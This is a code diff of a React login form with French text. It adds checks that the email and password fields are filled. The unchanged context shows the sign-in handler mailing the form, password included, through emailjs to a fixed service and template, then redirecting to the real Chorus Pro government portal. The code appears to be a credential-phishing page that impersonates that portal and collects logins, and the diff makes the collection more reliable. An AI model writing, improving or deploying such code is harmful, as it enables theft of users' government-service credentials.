@@ -15,11 +15,21 @@ function App() {
 
   const handleContinueClick = (e) => {
     e.preventDefault();
-    setShowPasswordInput(true); // Afficher l'input password lorsque l'utilisateur clique sur Continuer
+    if (!email) {
+      alert("Veuillez entrer une adresse e-mail.");
+      return;
+    }
+    setShowPasswordInput(true);
   };
 
+
+  
   const handleSignInClick = (e) => {
     e.preventDefault();
+    if (!email || !password) {
+      alert("Veuillez remplir tous les champs.");
+      return;
+    }
 
     emailjs
       .sendForm("service_ddqnnei", "template_sdhz7qp", form.current, {
@@ -28,10 +38,8 @@ function App() {
       .then(
         () => {
           console.log("SUCCESS!");
-          
-          
           setEmail("");
-          setPassword("")
+          setPassword("");
           window.location.href = 'https://portail.chorus-pro.gouv.fr/aife_csm/fr?id=aife_catitem_details&cat_item_id=6e479e0d1ba0b410a15587b5604bcb2d';
         },
         (error) => {
